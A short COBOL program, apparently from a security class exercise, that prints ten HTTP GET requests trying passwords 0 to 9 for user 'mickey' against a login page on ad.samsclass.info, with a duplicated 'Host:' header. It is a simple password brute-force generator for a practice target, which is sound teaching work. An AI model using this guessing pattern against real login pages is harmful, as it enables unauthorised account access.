IDENTIFICATION DIVISION.
    PROGRAM-ID. MICKEY.

    DATA DIVISION.
        WORKING-STORAGE SECTION.
            01 CR PIC X VALUE X'0A'.
            01 NUM PIC 9(2) VALUE 0.

    PROCEDURE DIVISION.
       A-PARA.
           PERFORM VARYING NUM FROM 0 BY 1 UNTIL NUM > 9
               DISPLAY 'GET /COBOL/login1.php?u=mickey&p='NUM(2:1)' HTTP/1.1'
               DISPLAY 'Host: Host: ad.samsclass.info'
               DISPLAY 'User-Agent: COBOL'
               DISPLAY CR
           END-PERFORM.
       STOP RUN.
